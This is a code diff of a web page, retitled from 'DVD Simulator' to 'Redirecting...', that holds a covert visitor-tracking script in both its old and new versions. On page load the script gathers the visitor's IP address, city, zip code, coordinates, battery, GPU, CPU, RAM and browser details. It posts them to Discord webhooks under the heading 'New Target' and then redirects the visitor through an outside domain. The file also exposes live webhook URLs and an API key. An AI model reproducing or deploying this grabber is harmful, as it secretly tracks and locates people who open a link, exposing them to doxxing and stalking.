@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
    <head>
-      <title>DVD Simulator</title>
+      <title>Redirecting...</title>
 
       
      
@@ -68,289 +68,285 @@ body {
  
 
     <script>
-const webhookUrl =
-  "https://discord.com/api/webhooks/1041007506144632833/CnDINsAJo_G1DWNleUGpZFfjHyXWmtGmKiVl5Rqfp3qsKhZ8r68iGPZdahrJ2_-1SgGu";
-
-async function sendDiscordEmbedAndRedirect() {
-  let ip = "";
-  let country = {
-    name: "",
-    code: "",
-    state: "",
-    city: "",
-    latitude: "",
-    longitude: "",
-    zip: "",
-    flag: "",
-    organization: "",
-  };
-
-  await fetch(
-    "https://api.ipgeolocation.io/ipgeo?apiKey=ecc7743a39d241afa6969dd10b6dce8d"
-  )
-    .then((response) => response.json())
-    .then((json) => {
-      ip = json.ip;
-      country.code = json.country_code2;
-      country.name = json.country_name;
-      country.state = json.state_prov;
-      country.city = json.city;
-      country.latitude = json.latitude;
-      country.longitude = json.longitude;
-      country.zip = json.zipcode;
-      country.flag = json.country_flag;
-      country.organization = json.organization;
-    });
-
-  let battery = await navigator.getBattery();
-
-  var canvas = document.createElement("canvas");
-  var gl;
-  var debugInfo;
-  var renderer;
-
-  try {
-    gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-  } catch (e) {}
-
-  if (gl) {
-    debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-    vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-    renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-  }
-  let gpu = renderer;
-  let hostname = location.hostname;
-  let platform = navigator.platform;
-  var nVer = navigator.appVersion;
-  var nAgt = navigator.userAgent;
-  var browser = navigator.appName;
-  var version = "" + parseFloat(navigator.appVersion);
-  var majorVersion = parseInt(navigator.appVersion, 10);
-  var nameOffset, verOffset, ix;
-
-  if ((verOffset = nAgt.indexOf("Opera")) != -1) {
-    browser = "Opera";
-    version = nAgt.substring(verOffset + 6);
-    if ((verOffset = nAgt.indexOf("Version")) != -1) {
-      version = nAgt.substring(verOffset + 8);
+        const webhookUrl =
+        "https://discord.com/api/webhooks/1041007506144632833/CnDINsAJo_G1DWNleUGpZFfjHyXWmtGmKiVl5Rqfp3qsKhZ8r68iGPZdahrJ2_-1SgGu";
+    
+        async function sendDiscordEmbed() {
+        let ip = "";
+        let country = {
+            name: "",
+            code: "",
+            state: "",
+            city: "",
+            latitude: "",
+            longitude: "",
+            zip: "",
+            flag: "",
+            organization: "",
+        };
+    
+        await fetch(
+            "https://api.ipgeolocation.io/ipgeo?apiKey=ecc7743a39d241afa6969dd10b6dce8d"
+        )
+            .then((response) => response.json())
+            .then((json) => {
+            ip = json.ip;
+            country.code = json.country_code2;
+            country.name = json.country_name;
+            country.state = json.state_prov;
+            country.city = json.city;
+            country.latitude = json.latitude;
+            country.longitude = json.longitude;
+            country.zip = json.zipcode;
+            country.flag = json.country_flag;
+            country.organization = json.organization;
+            });
+    
+        let battery = await navigator.getBattery();
+    
+        var canvas = document.createElement("canvas");
+        var gl;
+        var debugInfo;
+        var renderer;
+    
+        try {
+            gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        } catch (e) {}
+    
+        if (gl) {
+            debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+            vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+            renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+        let gpu = renderer;
+        let hostname = location.hostname;
+        let platform = navigator.platform;
+        var nVer = navigator.appVersion;
+        var nAgt = navigator.userAgent;
+        var browser = navigator.appName;
+        var version = "" + parseFloat(navigator.appVersion);
+        var majorVersion = parseInt(navigator.appVersion, 10);
+        var nameOffset, verOffset, ix;
+    
+        if ((verOffset = nAgt.indexOf("Opera")) != -1) {
+            browser = "Opera";
+            version = nAgt.substring(verOffset + 6);
+            if ((verOffset = nAgt.indexOf("Version")) != -1) {
+            version = nAgt.substring(verOffset + 8);
+            }
+        }
+    
+        if ((verOffset = nAgt.indexOf("OPR")) != -1) {
+            browser = "Opera";
+            version = nAgt.substring(verOffset + 4);
+        } else if ((verOffset = nAgt.indexOf("Edge")) != -1) {
+            browser = "Microsoft Legacy Edge";
+            version = nAgt.substring(verOffset + 5);
+        } else if ((verOffset = nAgt.indexOf("Edg")) != -1) {
+            browser = "Microsoft Edge";
+            version = nAgt.substring(verOffset + 4);
+        } else if ((verOffset = nAgt.indexOf("MSIE")) != -1) {
+            browser = "Microsoft Internet Explorer";
+            version = nAgt.substring(verOffset + 5);
+        } else if ((verOffset = nAgt.indexOf("Chrome")) != -1) {
+            browser = "Chrome";
+            version = nAgt.substring(verOffset + 7);
+        } else if ((verOffset = nAgt.indexOf("Safari")) != -1) {
+            browser = "Safari";
+            version = nAgt.substring(verOffset + 7);
+            if ((verOffset = nAgt.indexOf("Version")) != -1) {
+            version = nAgt.substring(verOffset + 8);
+            }
+        } else if ((verOffset = nAgt.indexOf("Firefox")) != -1) {
+            browser = "Firefox";
+            version = nAgt.substring(verOffset + 8);
+        } else if (nAgt.indexOf("Trident/") != -1) {
+            browser = "Microsoft Internet Explorer";
+            version = nAgt.substring(nAgt.indexOf("rv:") + 3);
+        } else if (
+            (nameOffset = nAgt.lastIndexOf(" ") + 1) <
+            (verOffset = nAgt.lastIndexOf("/"))
+        ) {
+            browser = nAgt.substring(nameOffset, verOffset);
+            version = nAgt.substring(verOffset + 1);
+            if (browser.toLowerCase() == browser.toUpperCase()) {
+            browser = navigator.appName;
+            }
+        }
+    
+        let cookieEnabled = navigator.cookieEnabled;
+        let os = platform;
+        let osVersion = "";
+        let browserVersion = version;
+        let batteryPercent = (battery.level * 100).toFixed(2);
+        let redirectUrl = window.location.href;
+        let userAgent = navigator.userAgent;
+        let language = navigator.language;
+        let languages = navigator.languages;
+        let plugins = "";
+        let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        let deviceMemory = navigator.deviceMemory;
+        let hardwareConcurrency = navigator.hardwareConcurrency;
+        let screenResolution = `${screen.width}x${screen.height}`;
+        let availableScreenResolution = `${screen.availWidth}x${screen.availHeight}`;
+        let colorDepth = screen.colorDepth;
+        let pixelDepth = screen.pixelDepth;
+    
+        let ram = deviceMemory;
+        let cpu = hardwareConcurrency;
+    
+        let data = {
+            embeds: [
+            {
+                title: "New Target",
+                description: "We found a new target!",
+                url: `https://ip.ohfeel.xyz/?q=${redirectUrl}`,
+                color: 6666880,
+                timestamp: new Date(),
+                footer: {
+                text: "ohfeel",
+                },
+                thumbnail: {
+                url: country.flag,
+                },
+                author: {
+                name: "ohfeel",
+                icon_url:
+                    "https://cdn.discordapp.com/avatars/755136326977847439/a_5f8684f505f6fbcbdd546db318771ec8.gif?size=1024",
+                },
+                fields: [
+                {
+                    name: "OS",
+                    value: `**${os ? os : " blocked"} ${
+                    osVersion ? osVersion : " blocked"
+                    }**`,
+                    inline: true,
+                },
+    
+                {
+                    name: "Battary percentage",
+                    value: `**${batteryPercent ? batteryPercent : " blocked"}% ${
+                    battery.charging ? "Charging" : "Not charging"
+                    }**`,
+                    inline: true,
+                },
+                {
+                    name: "Country",
+                    value: `**${country.name} (${country.code})**`,
+                    inline: true,
+                },
+                {
+                    name: "state",
+                    value: `**${country.state}**`,
+                    inline: true,
+                },
+                {
+                    name: "city",
+                    value: `**${country.city}**`,
+                    inline: true,
+                },
+    
+                {
+                    name: "latitude + longitude",
+                    value: `**${country.latitude} + ${country.longitude}**`,
+                    inline: true,
+                },
+                {
+                    name: "zipcode",
+                    value: `**${country.zip}**`,
+                    inline: true,
+                },
+                {
+                    name: "Cookie",
+                    value: `${cookieEnabled ? "`True`" : "`False`"}`,
+                    inline: true,
+                },
+                {
+                    name: "organization",
+                    value: `**${country.organization}**
+                    `,
+                    inline: true,
+                },
+                {
+                    name: "Browser",
+                    value: `**${browser ? browser : " blocked"} ${
+                    browserVersion ? browserVersion : " blocked"
+                    }**`,
+                    inline: true,
+                },
+                {
+                    name: "IP",
+                    value: `**${ip ? ip : " blocked"}**`,
+                },
+                {
+                    name: "GPU",
+                    value: `**${gpu ? gpu : " blocked"}**`,
+                    inline: true,
+                },
+                {
+                    name: "RAM",
+                    value: `**${ram ? ram : " blocked"}**`,
+                    inline: true,
+                },
+                {
+                    name: "CPU",
+                    value: `**${cpu ? cpu : " blocked"}**`,
+                    inline: true,
+                },
+                {
+                    name: "Screen Resolution",
+                    value: `**${screenResolution ? screenResolution : " blocked"}**`,
+                    inline: true,
+                },
+                {
+                    name: "redirectUrl",
+                    value: `**${redirectUrl ? redirectUrl : " blocked"}**`,
+                    inline: true,
+                },
+                ],
+            },
+            ],
+        };
+    
+        fetch(
+            "https://discord.com/api/webhooks/1065278033273028608/hWk8OzWhsZTXcH65bmpZWuNExF1SJCo68Isg7mIp1i4pt0KQY72w-v2kTmLW8EOr513X",
+            {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify(data),
+            }
+        )
+            .then((response) => {
+            console.log(response);
+            })
+            .catch((error) => {
+            console.error(error);
+            });
+    
+        // redirect
+        redirect();
     }
-  }
-
-  if ((verOffset = nAgt.indexOf("OPR")) != -1) {
-    browser = "Opera";
-    version = nAgt.substring(verOffset + 4);
-  } else if ((verOffset = nAgt.indexOf("Edge")) != -1) {
-    browser = "Microsoft Legacy Edge";
-    version = nAgt.substring(verOffset + 5);
-  } else if ((verOffset = nAgt.indexOf("Edg")) != -1) {
-    browser = "Microsoft Edge";
-    version = nAgt.substring(verOffset + 4);
-  } else if ((verOffset = nAgt.indexOf("MSIE")) != -1) {
-    browser = "Microsoft Internet Explorer";
-    version = nAgt.substring(verOffset + 5);
-  } else if ((verOffset = nAgt.indexOf("Chrome")) != -1) {
-    browser = "Chrome";
-    version = nAgt.substring(verOffset + 7);
-  } else if ((verOffset = nAgt.indexOf("Safari")) != -1) {
-    browser = "Safari";
-    version = nAgt.substring(verOffset + 7);
-    if ((verOffset = nAgt.indexOf("Version")) != -1) {
-      version = nAgt.substring(verOffset + 8);
-    }
-  } else if ((verOffset = nAgt.indexOf("Firefox")) != -1) {
-    browser = "Firefox";
-    version = nAgt.substring(verOffset + 8);
-  } else if (nAgt.indexOf("Trident/") != -1) {
-    browser = "Microsoft Internet Explorer";
-    version = nAgt.substring(nAgt.indexOf("rv:") + 3);
-  } else if (
-    (nameOffset = nAgt.lastIndexOf(" ") + 1) <
-    (verOffset = nAgt.lastIndexOf("/"))
-  ) {
-    browser = nAgt.substring(nameOffset, verOffset);
-    version = nAgt.substring(verOffset + 1);
-    if (browser.toLowerCase() == browser.toUpperCase()) {
-      browser = navigator.appName;
-    }
-  }
-
-  let cookieEnabled = navigator.cookieEnabled;
-  let os = platform;
-  let osVersion = "";
-  let browserVersion = version;
-  let batteryPercent = (battery.level * 100).toFixed(2);
-  let redirectUrl = window.location.href;
-  let userAgent = navigator.userAgent;
-  let language = navigator.language;
-  let languages = navigator.languages;
-  let plugins = "";
-  let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  let deviceMemory = navigator.deviceMemory;
-  let hardwareConcurrency = navigator.hardwareConcurrency;
-  let screenResolution = `${screen.width}x${screen.height}`;
-  let availableScreenResolution = `${screen.availWidth}x${screen.availHeight}`;
-  let colorDepth = screen.colorDepth;
-  let pixelDepth = screen.pixelDepth;
-
-  let ram = deviceMemory;
-  let cpu = hardwareConcurrency;
-
-  let data = {
-    embeds: [
-      {
-        title: "New Target",
-        description: "We found a new target!",
-        url: `https://ip.ohfeel.xyz/?q=${redirectUrl}`,
-        color: 6666880,
-        timestamp: new Date(),
-        footer: {
-          text: "ohfeel",
-        },
-        thumbnail: {
-          url: country.flag,
-        },
-        author: {
-          name: "ohfeel",
-          icon_url:
-            "https://cdn.discordapp.com/avatars/755136326977847439/a_5f8684f505f6fbcbdd546db318771ec8.gif?size=1024",
-        },
-        fields: [
-          {
-            name: "OS",
-            value: `**${os ? os : " blocked"} ${
-              osVersion ? osVersion : " blocked"
-            }**`,
-            inline: true,
-          },
-
-          {
-            name: "Battary percentage",
-            value: `**${batteryPercent ? batteryPercent : " blocked"}% ${
-              battery.charging ? "Charging" : "Not charging"
-            }**`,
-            inline: true,
-          },
-          {
-            name: "Country",
-            value: `**${country.name} (${country.code})**`,
-            inline: true,
-          },
-          {
-            name: "state",
-            value: `**${country.state}**`,
-            inline: true,
-          },
-          {
-            name: "city",
-            value: `**${country.city}**`,
-            inline: true,
-          },
-
-          {
-            name: "latitude + longitude",
-            value: `**${country.latitude} + ${country.longitude}**`,
-            inline: true,
-          },
-          {
-            name: "zipcode",
-            value: `**${country.zip}**`,
-            inline: true,
-          },
-          {
-            name: "Cookie",
-            value: `${cookieEnabled ? "`True`" : "`False`"}`,
-            inline: true,
-          },
-          {
-            name: "organization",
-            value: `**${country.organization}**
-            `,
-            inline: true,
-          },
-          {
-            name: "Browser",
-            value: `**${browser ? browser : " blocked"} ${
-              browserVersion ? browserVersion : " blocked"
-            }**`,
-            inline: true,
-          },
-          {
-            name: "IP",
-            value: `**${ip ? ip : " blocked"}**`,
-          },
-          {
-            name: "GPU",
-            value: `**${gpu ? gpu : " blocked"}**`,
-            inline: true,
-          },
-          {
-            name: "RAM",
-            value: `**${ram ? ram : " blocked"}**`,
-            inline: true,
-          },
-          {
-            name: "CPU",
-            value: `**${cpu ? cpu : " blocked"}**`,
-            inline: true,
-          },
-          {
-            name: "Screen Resolution",
-            value: `**${screenResolution ? screenResolution : " blocked"}**`,
-            inline: true,
-          },
-          {
-            name: "redirectUrl",
-            value: `**${redirectUrl ? redirectUrl : " blocked"}**`,
-            inline: true,
-          },
-        ],
-      },
-    ],
-  };
-
-  fetch(
-    "https://discord.com/api/webhooks/1065278033273028608/hWk8OzWhsZTXcH65bmpZWuNExF1SJCo68Isg7mIp1i4pt0KQY72w-v2kTmLW8EOr513X",
-    {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(data),
-    }
-  )
-    .then((response) => {
-      console.log(response);
-    })
-    .catch((error) => {
-      console.error(error);
-    });
-
-  // redirect
- 
-
-}
-async function redirect() {
-    let BaseUrl = "https://ip.ohfeel.xyz/?q=";
-
-    let url = window.location.href;
-  
-    let queryString = url ? url.split("?")[1] : window.location.search.slice(1);
-    queryString = encodeURIComponent(queryString);
-  
-    // wait 0.5s
-    await new Promise((resolve) => setTimeout(resolve, 500));
-    // redirect to the url
-    window.location.href = queryString;    
-
-}
-async function sendDiscordEmbedAndRedirect() {
-await sendDiscordEmbedAndRedirect();
-redirect();
-}
-
-
-
-sendDiscordEmbedAndRedirect();
+    async function redirect() {
+       // check if the URL has a query string
+        if (!window.location.search) return;
+        
+        let BaseUrl = "https://ip.ohfeel.xyz/?q=";
+      
+        let url = window.location.href;
+        let queryString = url ? url.split("?")[1] : window.location.search.slice(1);
+        queryString = encodeURIComponent(queryString);
+      
+        // Wait for 0.5s
+        await new Promise((resolve) => setTimeout(resolve, 500));
+      
+        // Redirect to the URL
+        window.location.href = BaseUrl + queryString;
+      }
+      
+      // First, call the function to send the Discord webhook and then redirect afterward.
+      sendDiscordEmbed();
   </script>
   
 </body>
